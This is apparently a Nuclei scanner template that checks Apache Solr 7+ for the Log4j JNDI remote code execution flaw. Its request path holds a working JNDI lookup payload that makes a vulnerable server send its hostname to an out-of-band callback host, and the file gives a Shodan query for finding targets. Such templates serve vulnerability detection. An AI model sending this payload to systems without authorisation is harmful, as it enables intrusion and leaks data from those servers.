id: solr-log4j-rce
info:
  author: Evan Rubinstein,nvn1729
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  description: 'Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages,
    and parameters do not protect against attacker controlled LDAP and other JNDI
    related endpoints. This vulnerability affects Solr 7+.

    '
  metadata:
    shodan-query: http.html:"Apache Solr"
    verified: true
  name: Apache Solr 7+ - Log4j Remote Code Execution
  reference:
  - https://github.com/projectdiscovery/nuclei-templates/blob/c8d2139e545775c34f5fb9e93d0da7a9d9aef0bd/vulnerabilities/apache/apache-solr-log4j-rce.yaml
  severity: critical
  tags: cve,cve2021,solr,oast,log4j,rce,apache,jndi
requests:
- extractors:
  - group: 1
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/solr/admin/collections?action=$%7Bjndi:ldap://$%7BhostName%7D.{{interactsh-url}}/a%7D'
